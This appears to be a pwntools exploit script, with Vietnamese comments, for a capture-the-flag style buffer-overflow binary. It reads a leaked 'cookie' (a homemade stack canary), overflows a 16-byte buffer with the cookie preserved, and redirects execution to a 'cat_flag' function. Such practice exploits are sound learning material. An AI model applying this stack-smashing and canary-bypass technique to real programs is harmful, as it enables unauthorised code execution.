from pwn import *

# Cấu hình
context.log_level = 'debug'       # Log chi tiết
p = process('./Bufferoverflow-homemade-cookie-v2')  # Chạy chương trình
elf = ELF('./Bufferoverflow-homemade-cookie-v2')    # Load binary

# Đọc giá trị cookie từ stdout
cookie = int(p.recvline(False), 16)
log.info('Cookie: ' + hex(cookie))

# Tạo payload
payload = b'a' * 16               # Ghi đè buffer
payload += p32(cookie)            # Đúng giá trị cookie
payload += b'\x00' * 12           # Align stack frame
payload += p32(elf.sym['cat_flag'])  # Địa chỉ hàm cat_flag

# Gửi payload
p.sendline(payload)

# Tương tác với process (nếu cần)
p.interactive()
print ("Hellohhhho")
